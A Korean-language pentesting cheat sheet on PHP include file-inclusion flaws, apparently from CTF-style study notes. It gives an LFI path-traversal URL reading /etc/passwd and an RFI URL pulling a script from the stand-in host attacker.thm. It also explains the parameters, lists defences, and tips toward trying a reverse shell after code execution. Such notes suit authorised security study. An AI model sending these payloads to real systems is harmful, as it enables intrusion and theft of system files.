# php_include

## 개요

PHP의 `include`/`require`에 사용자 입력이 그대로 넘어가면, 파일 포함(LFI/RFI) 취약점이 생긴다.
로컬 파일 경로를 조작해 민감 파일을 읽거나, 원격 스크립트를 포함시킬 수 있다.

## 사용법

```bash
# 로컬 파일 포함 (LFI)
http://target/index.php?lang=../../../../etc/passwd

# 원격 파일 포함 (RFI, allow_url_include 필요)
http://target/index.php?lang=http://attacker.thm/cmd.txt
```

- `../../../../etc/passwd`: 경로 순회로 상위 디렉터리의 파일을 읽는다.
- `http://...`: 원격 스크립트를 포함해 원격 코드 실행으로 이어진다.

## 각 파라미터의 의미

| 항목 | 의미 |
|------|------|
| `lang` | 포함할 파일을 지정하는 파라미터 (대상마다 이름 다름) |
| `../../../` | 경로 순회 (상위 디렉터리로 이동) |
| `http://` | 원격 URL 포함 (RFI) |

## 방어

- `allow_url_include`를 비활성화한다.
- 파일 경로를 허용된 디렉터리로 제한한다(open_basedir).
- 파일 파라미터는 화이트리스트(허용된 이름)로 검증한다.

## 관련 치트시트

- RFI 상세: [rfi.md](rfi.md)
- RFI 예시(Smartermail): [cuppa_rfi.md](cuppa_rfi.md)
- NULL 바이트 우회(구버전 PHP): [null_byte.md](null_byte.md)

## 증적 팁

- 발견한 파라미터와 payload, 응답을 노트(05-progress-tracker)에 기록한다.
- 원격 코드 실행까지 이어지면 리버스 쉘 연결을 시도한다.
- 모든 테스트는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
